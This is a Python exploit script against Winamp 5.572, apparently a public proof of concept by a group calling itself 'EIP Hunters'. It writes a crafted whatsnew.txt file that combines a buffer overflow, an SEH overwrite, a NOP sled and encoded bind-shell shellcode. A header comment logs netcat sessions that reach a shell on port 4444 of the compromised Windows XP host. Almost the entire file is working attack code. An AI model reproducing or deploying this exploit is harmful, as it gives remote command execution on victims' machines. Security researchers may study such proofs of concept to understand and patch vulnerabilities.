#!/usr/bin/python
#
################################################################
# 
# Exploit Title: Winamp
#
################################################################
#
# tecr0c@backtrack:~/exploits/winamp$ nc -v 192.168.2.24 4444
# 192.168.2.24: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [192.168.2.24] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Winamp>exit
# exit
# tecr0c@backtrack:~/exploits/winamp$ nc -v 192.168.2.24 4444
# 192.168.2.24: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [192.168.2.24] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Winamp>exit
# exit
# tecr0c@backtrack:~/exploits/winamp$ nc -v 192.168.2.24 4444
# 192.168.2.24: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [192.168.2.24] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Winamp> 

print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|								  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"


bind = (
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x9a\xec"
"\x40\xbd\x83\xeb\xfc\xe2\xf4\x66\x86\xab\xf0\x72\x15\xbf\x42"
"\x65\x8c\xcb\xd1\xbe\xc8\xcb\xf8\xa6\x67\x3c\xb8\xe2\xed\xaf"
"\x36\xd5\xf4\xcb\xe2\xba\xed\xab\xf4\x11\xd8\xcb\xbc\x74\xdd"
"\x80\x24\x36\x68\x80\xc9\x9d\x2d\x8a\xb0\x9b\x2e\xab\x49\xa1"
"\xb8\x64\x95\xef\x09\xcb\xe2\xbe\xed\xab\xdb\x11\xe0\x0b\x36"
"\xc5\xf0\x41\x56\x99\xc0\xcb\x34\xf6\xc8\x5c\xdc\x59\xdd\x9b"
"\xd9\x11\xaf\x70\x36\xda\xe0\xcb\xcd\x86\x41\xcb\xfd\x92\xb2"
"\x28\x33\xd4\xe2\xac\xed\x65\x3a\x26\xee\xfc\x84\x73\x8f\xf2"
"\x9b\x33\x8f\xc5\xb8\xbf\x6d\xf2\x27\xad\x41\xa1\xbc\xbf\x6b"
"\xc5\x65\xa5\xdb\x1b\x01\x48\xbf\xcf\x86\x42\x42\x4a\x84\x99"
"\xb4\x6f\x41\x17\x42\x4c\xbf\x13\xee\xc9\xbf\x03\xee\xd9\xbf"
"\xbf\x6d\xfc\x84\x51\xe1\xfc\xbf\xc9\x5c\x0f\x84\xe4\xa7\xea"
"\x2b\x17\x42\x4c\x86\x50\xec\xcf\x13\x90\xd5\x3e\x41\x6e\x54"
"\xcd\x13\x96\xee\xcf\x13\x90\xd5\x7f\xa5\xc6\xf4\xcd\x13\x96"
"\xed\xce\xb8\x15\x42\x4a\x7f\x28\x5a\xe3\x2a\x39\xea\x65\x3a"
"\x15\x42\x4a\x8a\x2a\xd9\xfc\x84\x23\xd0\x13\x09\x2a\xed\xc3"
"\xc5\x8c\x34\x7d\x86\x04\x34\x78\xdd\x80\x4e\x30\x12\x02\x90"
"\x64\xae\x6c\x2e\x17\x96\x78\x16\x31\x47\x28\xcf\x64\x5f\x56"
"\x42\xef\xa8\xbf\x6b\xc1\xbb\x12\xec\xcb\xbd\x2a\xbc\xcb\xbd"
"\x15\xec\x65\x3c\x28\x10\x43\xe9\x8e\xee\x65\x3a\x2a\x42\x65"
"\xdb\xbf\x6d\x11\xbb\xbc\x3e\x5e\x88\xbf\x6b\xc8\x13\x90\xd5"
"\x6a\x66\x44\xe2\xc9\x13\x96\x42\x4a\xec\x40\xbd")

buff = "Winamp 5.572"
buff += "\x41" * 672
buff += "\xeb\x06\x90\x90"
buff += "\x46\x59\xb0\x01"
buff += "\x90" * 30
buff += bind
buff += "\xcc" * (6000-len(buff))


try:
   zip = open("whatsnew.txt",'w')
   zip.write(buff)
   zip.close()
   print "[+] Vulnerable file created!\n"
except:
   print "[-] Error occured!"
